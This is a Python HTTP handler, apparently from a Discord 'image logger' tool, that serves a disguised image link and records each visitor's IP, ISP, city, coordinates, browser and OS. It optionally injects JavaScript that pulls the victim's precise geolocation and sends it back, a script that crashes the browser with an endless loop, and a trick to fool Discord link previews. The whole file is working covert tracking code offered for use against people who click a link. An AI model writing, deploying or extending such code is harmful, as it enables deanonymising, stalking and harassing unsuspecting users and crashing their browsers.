class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
